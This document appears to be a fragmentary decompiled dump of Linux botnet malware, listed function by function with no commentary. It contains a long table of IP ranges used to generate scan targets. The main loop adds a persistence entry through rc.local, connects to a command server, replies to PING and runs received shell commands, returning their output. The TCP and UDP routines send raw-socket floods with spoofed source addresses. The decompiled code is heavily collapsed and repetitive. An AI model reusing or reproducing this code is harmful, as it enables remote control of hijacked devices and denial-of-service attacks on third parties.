        szprintf((int32_t)&v216, (int32_t)"27.50.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"27.54.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"27.98.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"27.112.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"27.192.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"36.32.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"36.248.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"39.64.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"42.4.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"42.48.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"42.52.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"42.56.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"42.63.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"42.84.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"42.176.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"42.224.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"42.176.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"43.253.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"43.230.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"163.53.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"43.230.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"62.252.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"43.245.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"62.255.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"123.25.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.54.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"27.255.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.204.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"123.24.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.191.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"81.100.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.188.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.189.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"94.174.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.160.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.161.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.162.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.163.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.164.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.165.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.166.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.167.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.168.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.169.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.170.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.171.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.172.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.173.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.174.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.175.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.176.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.177.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.178.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.179.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.180.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.181.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.182.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.183.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.184.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.185.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.186.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.187.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.188.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.189.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.190.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.191.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"45.121.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"45.120.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"45.115.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"43.252.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"43.230.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"43.240.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"43.245.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"41.174.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"49.118.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"78.188.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"45.127.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.30.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.33.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"123.16.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"202.44.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"116.93.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"91.83.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"41.253.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"117.173.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.190.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"146.88.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"112.196.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.178.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"112.45.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"183.223.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"116.71.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.44.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"110.235.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"124.253.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"211.237.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"117.175.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"117.173.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"178.93.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"111.9.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"222.252.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.174.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"222.252.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.160.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.161.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.162.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.163.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.164.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.165.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.166.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.167.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.168.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.169.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"123.17.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"123.18.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"123.19.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"123.20.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"123.21.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"123.22.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"222.252.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"222.253.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"222.254.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"222.255.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"37.247.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"41.208.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"183.220.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"175.201.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.198.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"183.223.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"50.205.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"88.248.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"88.105.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"88.247.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"85.105.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"188.3.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.203.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.55.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.220.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"183.233.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.242.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.198.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.14.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.195.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.203.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.214.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.218.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.225.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.228.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.231.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.60.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.248.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.253.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.255.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.35.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.49.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.62.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"144.48.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"163.47.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"163.53.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"223.29.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"59.153.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.176.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.175.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.177.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"113.183.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"202.164.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"203.134.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"210.56.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"49.156.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"203.210.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"117.181.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"117.178.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"117.177.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"117.176.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"117.170.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"117.171.%d.%d", (int32_t)v213);
        szprintf(v217, (int32_t)"117.162.%d.%d", (int32_t)v213);
        szprintf(v217, (int32_t)"112.26.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"112.27.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"112.28.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"112.29.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"112.30.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"112.31.%d.%d", (int32_t)v213);
        szprintf(v218, (int32_t)"203.150.%d.%d", (int32_t)v213);
    return inet_addr(v218);
=================FUNCTION : main ===================
++++++++ FUNCTION START 23899
++++++++ FUNCTION END 24752
++++++++ FUNCTION LENGTH 853
    srand(v208 ^ __libc_getpid());
    init_rand(v209 ^ __libc_getpid());
    int32_t v210 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x1000b99c
        v211 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        getcwd(v227, 256);
            __GI_fclose((int16_t *)v211);
                sprintf(v233, (int32_t)"\"%s%s\"\n", v227, v232 + v236, 0x10010000, v229, 0x10010000, (int32_t)&v235);
                while (true) {
                    while (true) {
                            fgets(v234, 1024, v211);
                            if (__GI_strcasecmp(v234, v233) == 0) {
                            __GI_fclose((int16_t *)v211);
                            int32_t v239 = __GI_fopen((int32_t)v212, (int32_t)&v238); // 0x1000bb10
                                __GI_fclose((int16_t *)v239);
                            getOurIP();
                            v220 = __libc_fork();
                                if (__libc_fork() == 0) {
                                    zprintf((int32_t)"fork failed\n", 0x10010000);
                                while (true) {
                                    if (initConnection() != 0) {
                                        while (true) {
                                            if (initConnection() == 0) {
                                        v244 = getBuild(0x10030000);
                                        __GI_inet_ntoa(&v243, 0x10030000);
                                        sockprintf(v241, (int32_t)"BUILD %s:%s", v244);
                                        while (true) {
                                            while (true) {
                                                if (recvLine(v214, (char *)&v215, 0x1000, v224) == -1) {
                                                while (true) {
                                                                if (__libc_waitpid(v252, 0, 1) >= 1) {
                                                                    while (true) {
                                                                                while (true) {
                                                                                            free();
                                                        if (strstr(v224, "PING", 0x10010000) == v224) {
                                                            sockprintf(v214, (int32_t)"PONG", 0x10010000);
                                                            if (strstr(v224, "DUP", 0x10010000) == v224) {
                                                                zprintf((int32_t)"PEACE OUT IMMA DUP\n", 0x10010000);
                                                        while (true) {
                                                            if (initConnection() == 0) {
                                                        while (true) {
                                                        while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                                    while (true) {
                                                                                    processCmd(v277, &v230);
                                                                                processCmd(v277, &v230);
                                                                            while (true) {
                                                                            free();
                                                                                free();
                                                                            while (true) {
                                                    if (__libc_waitpid(v252, 0, 1) < 1) {
                                    v244 = getBuild(0x10030000);
                                    __GI_inet_ntoa(&v243, 0x10030000);
                                    sockprintf(v241, (int32_t)"BUILD %s:%s", v244);
                                __libc_waitpid(v220, (int32_t)&v217, 0);
                                zprintf((int32_t)"fork failed\n", 0x10010000);
                            while (true) {
                                if (initConnection() == 0) {
            sprintf(v233, (int32_t)"\"%s%s\"\n", v227, v232 + v225, 0x10010000, v229, 0x10010000, (int32_t)&v235);
            while (true) {
        getOurIP();
        v220 = __libc_fork();
            if (__libc_fork() == 0) {
                zprintf((int32_t)"fork failed\n", 0x10010000);
            while (true) {
                if (initConnection() == 0) {
            __libc_waitpid(v220, (int32_t)&v217, 0);
            zprintf((int32_t)"fork failed\n", 0x10010000);
        while (true) {
            if (initConnection() == 0) {
    getOurIP();
    v220 = __libc_fork();
        if (__libc_fork() == 0) {
            zprintf((int32_t)"fork failed\n", 0x10010000);
        while (true) {
            if (initConnection() == 0) {
        __libc_waitpid(v220, (int32_t)&v217, 0);
        zprintf((int32_t)"fork failed\n", 0x10010000);
    while (true) {
        if (initConnection() == 0) {
    szprintf(v222, (int32_t)"%s 2>&1", v221);
    int32_t v286 = fdpopen(v222, "r"); // 0x1000c27c
    while (true) {
        if (fdgets(v222, 1024, v286) == 0) {
            fdpclose(v286);
            sockprintf(v214, (int32_t)"%s", v222);
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 47373
++++++++ FUNCTION END 48464
++++++++ FUNCTION LENGTH 1091
    int32_t v215 = __get_hosts_byname_r(a1, 2, (int32_t)a2, a3, a4, a5, a6); // 0x1000f6e0
                                        v244 = inet_aton((char *)a1);
                                        __open_nameservers();
                                        v245 = __dns_lookup((char *)a1, 1, v217, (int32_t)&v218, (int32_t)&v224, (int32_t)&v223);
                                            free();
                                            free();
                                                    while (true) {
                                            free();
                                                free();
                                                free();
                                            v244 = inet_aton((char *)a1);
                                            __open_nameservers();
                                            v245 = __dns_lookup((char *)a1, 1, v217, (int32_t)&v218, (int32_t)&v224, (int32_t)&v223);
                                                free();
                                                free();
                                                        while (true) {
                                                            free();
                                                                free();
                                                            free();
                                                free();
                                                    free();
                                                    free();
                            v244 = inet_aton((char *)a1);
                            __open_nameservers();
                            v245 = __dns_lookup((char *)a1, 1, v217, (int32_t)&v218, (int32_t)&v224, (int32_t)&v223);
                                free();
                                free();
                                        while (true) {
                                            free();
                                                free();
                                            free();
                                free();
                                    free();
                                    free();
                                v244 = inet_aton((char *)a1);
                                __open_nameservers();
                                v245 = __dns_lookup((char *)a1, 1, v217, (int32_t)&v218, (int32_t)&v224, (int32_t)&v223);
                                    free();
                                    free();
                                            while (true) {
                                                free();
                                                    free();
                                                free();
                                    free();
                                        free();
                                        free();
                        v244 = inet_aton((char *)a1);
                            __open_nameservers();
                            v245 = __dns_lookup((char *)a1, 1, v217, (int32_t)&v218, (int32_t)&v224, (int32_t)&v223);
                                    free();
                                    free();
                                            while (true) {
                                                free();
                                                    free();
                                                    free();
                                    free();
                                        free();
                                        free();
                            v244 = inet_aton((char *)a1);
                                __open_nameservers();
                                v245 = __dns_lookup((char *)a1, 1, v217, (int32_t)&v218, (int32_t)&v224, (int32_t)&v223);
                                        free();
                                        free();
                                                while (true) {
                                                    free();
                                                        free();
                                                        free();
                                        free();
                                            free();
                                            free();
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 71763
++++++++ FUNCTION END 72743
++++++++ FUNCTION LENGTH 980
                        while (true) {
                            while (true) {
                                    __libc_close(v229);
                                        if (inet_pton(10, (char *)v239, (int32_t)&v240) < 1) {
                                            inet_addr(v239);
                                        int32_t v243 = socket((int32_t)v242, 2, 17); // 0x10012b90
                                            if (__libc_connect(v226, 28, 28) > -1) {
                                                __libc_send(v213, v210, result + v246, 0);
                                                    int32_t v247 = __libc_recv(v213, v210, 512, 0); // 0x10012c10
                                                                                __libc_close(v215);
                                                                            free();
                                                                            free();
                                                                            while (true) {
                                                                                        __libc_close(v213);
                                                                                            free();
                                                                                            free();
                                                                                        free();
                                                                                        free();
                                                                                                free();
                                                                                            free();
                                                                                        __libc_close(v213);
                                                                                            free();
                                                                                            free();
                                                                                        free();
                                                                                        __libc_close(v213);
                                                                                            free();
                                                                                            free();
                                                                                        free();
                                                                                    __libc_close(v213);
                                                                                        free();
                                                                                        free();
                                                                                    free();
                                                                            __libc_close(v213);
                                                                                free();
                                                                                free();
                                                                            free();
                                                                        __libc_close(v213);
                                                                            free();
                                                                            free();
                                                                        free();
                                                                        free();
                                                                        __libc_close(v215);
                                                                    free();
                                                                    free();
                                                                    __libc_close(v215);
                                                                free();
                                                                free();
                                __libc_close(v215);
                            free();
                            free();
                        __libc_close(v215);
                    free();
                    free();
                    __libc_close(v215);
                free();
                free();
                __libc_close(v215);
            free();
            free();
            __libc_close(v215);
        free();
        free();
        __libc_close(v215);
    free();
    free();
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 65212
++++++++ FUNCTION END 69198
++++++++ FUNCTION LENGTH 3986
            while (true) {
                while (true) {
                                    while (true) {
                                                                                    while (true) {
                                                                                                        while (true) {
                                                                                                    while (true) {
                                                                                                while (true) {
                                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                                                    while (true) {
                                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                        while (true) {
                                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                            while (true) {
                                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                            while (true) {
        while (true) {
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 5009
++++++++ FUNCTION END 5537
++++++++ FUNCTION LENGTH 528
            v220 = __vfork();
                __libc_close(v217);
                __libc_close(v218);
                            __libc_close(v218);
                        __libc_close(v217);
                            __libc_close(v217);
                        __libc_close(v218);
                    __libc_close(v218);
                    __libc_close(v224);
        v221 = getdtablesize(0x10030000);
        v220 = __vfork();
            __libc_close(v217);
            __libc_close(v218);
                        __libc_close(v218);
                    __libc_close(v217);
                        __libc_close(v217);
                    __libc_close(v218);
                __libc_close(v218);
                __libc_close(v224);
        v220 = __vfork();
            __libc_close(v217);
            __libc_close(v218);
                        __libc_close(v218);
                    __libc_close(v217);
                        __libc_close(v217);
                    __libc_close(v218);
                __libc_close(v218);
                __libc_close(v224);
    v221 = getdtablesize(0x10030000);
    v220 = __vfork();
        __libc_close(v217);
        __libc_close(v218);
                    __libc_close(v218);
                __libc_close(v217);
                    __libc_close(v217);
                __libc_close(v218);
            __libc_close(v218);
            __libc_close(v224);
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 15741
++++++++ FUNCTION END 16212
++++++++ FUNCTION LENGTH 471
        rand_cmwc();
    int32_t result = getHost(a1, &v215, v214); // 0x10009688
    int32_t v216 = socket(2, 3, 6); // 0x100096c0
        result2 = sockprintf(v217, (int32_t)"Failed opening raw socket.", 0x10010000);
    if (__GI_setsockopt(v216, 0, 3, (int32_t)&v218, 4) > -1) {
        int32_t v225 = GetRandomIP(v219); // 0x100097e4
        *v224 = (int16_t)rand_cmwc();
        int32_t v227 = rand_cmwc(); // 0x1000982c
                while (true) {
                        if (__GI_strcoll(v242, (int32_t)"rst") == 0) {
                                    if (__GI_strcoll(v242, (int32_t)"psh") == 0) {
                                        sockprintf(v217, (int32_t)"Invalid flag \"%s\"", v241);
                rand_cmwc();
                    rand_cmwc();
                *v235 = (int16_t)tcpcsum(v222, v234, v223);
                while (true) {
                    __libc_sendto(v216, v222, v220, 0, v214, 16, v214);
                    v231 = GetRandomIP(v219);
                    *(int16_t *)(v222 | 4) = (int16_t)rand_cmwc();
                    *v228 = rand_cmwc();
                    *v224 = (int16_t)rand_cmwc();
                    *v235 = (int16_t)tcpcsum(v222, v234, v223);
        rand_cmwc();
            rand_cmwc();
        *v235 = (int16_t)tcpcsum(v222, v234, v223);
        while (true) {
            __libc_sendto(v216, v222, v220, 0, v214, 16, v214);
            v231 = GetRandomIP(v219);
            *(int16_t *)(v222 | 4) = (int16_t)rand_cmwc();
            *v228 = rand_cmwc();
            *v224 = (int16_t)rand_cmwc();
            *v235 = (int16_t)tcpcsum(v222, v234, v223);
        result2 = sockprintf(v217, (int32_t)"Failed setting raw headers mode.", 0x10010000);
=================FUNCTION : prints ===================
++++++++ FUNCTION START 2799
++++++++ FUNCTION END 3450
++++++++ FUNCTION LENGTH 651
                while (true) {
                    printchar((int32_t *)a1, v217);
                            printchar((int32_t *)a1, v217);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v224);
                        printchar((int32_t *)a1, v217);
                    printchar((int32_t *)a1, v217);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v224);
                printchar((int32_t *)a1, v217);
                while (true) {
                    printchar((int32_t *)a1, v217);
                            printchar((int32_t *)a1, v217);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v224);
                        printchar((int32_t *)a1, v217);
                    printchar((int32_t *)a1, v217);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v224);
                printchar((int32_t *)a1, v217);
            while (true) {
                printchar((int32_t *)a1, v217);
                        printchar((int32_t *)a1, v217);
            printchar((int32_t *)a1, (int32_t)*a2);
                printchar((int32_t *)a1, (int32_t)*v224);
                    printchar((int32_t *)a1, v217);
                printchar((int32_t *)a1, v217);
    printchar((int32_t *)a1, (int32_t)*a2);
        printchar((int32_t *)a1, (int32_t)*v224);
            printchar((int32_t *)a1, v217);
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 15312
++++++++ FUNCTION END 15738
++++++++ FUNCTION LENGTH 426
        rand_cmwc();
    int32_t result = getHost(a1, &v216, v215); // 0x10008ffc
        int32_t v219 = socket(2, 2, 17); // 0x10009044
            result3 = sockprintf(v217, (int32_t)"Failed opening raw socket.", 0x10010000);
                makeRandomStr(v220, a5);
                while (true) {
                    while (true) {
                        __libc_sendto(v219, v220, a5, 0, v215, 16, v215);
                                rand_cmwc();
    int32_t v226 = socket(2, 3, 17); // 0x100091c8
        if (__GI_setsockopt(v226, 0, 3, (int32_t)&v227, 4) > -1) {
                srand(v228 ^ rand_cmwc());
                init_rand(random());
            int32_t v233 = GetRandomIP(v229); // 0x10009348
            *v232 = (int16_t)rand_cmwc();
                v235 = rand_cmwc();
            makeRandomStr(v231 + 28, a5);
            while (true) {
                while (true) {
                    __libc_sendto(v226, v231, a5 + 28, 0, v215, 16, v215);
                    *v232 = (int16_t)rand_cmwc();
                        v247 = rand_cmwc();
                    *(int16_t *)(v231 | 4) = (int16_t)rand_cmwc();
                    *(int32_t *)(v231 | 12) = htonl(GetRandomIP(v229));
            result5 = sockprintf(v217, (int32_t)"Failed setting raw headers mode.", 0x10010000);
    result5 = sockprintf(v217, (int32_t)"Failed opening raw socket.", 0x10010000);
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 81207
++++++++ FUNCTION END 81882
++++++++ FUNCTION LENGTH 675
            while (true) {
                if (fgets(v217, v219, a1) != 0) {
                    __GI_fclose((int16_t *)a1);
                                v223 = __open_etc_hosts();
                                    while (true) {
                                        if (fgets(v217, v219, a1) != 0) {
                                            __GI_fclose((int16_t *)a1);
        while (true) {
            if (fgets(v217, v219, a1) != 0) {
                    while (true) {
                            while (true) {
                                        while (true) {
                                        while (true) {
                                            if (__GI_strcasecmp(a2, v253) == 0) {
                                            if (inet_pton(2, (char *)v255, v218) > 0) {
                                                    __GI_fclose((int16_t *)a1);
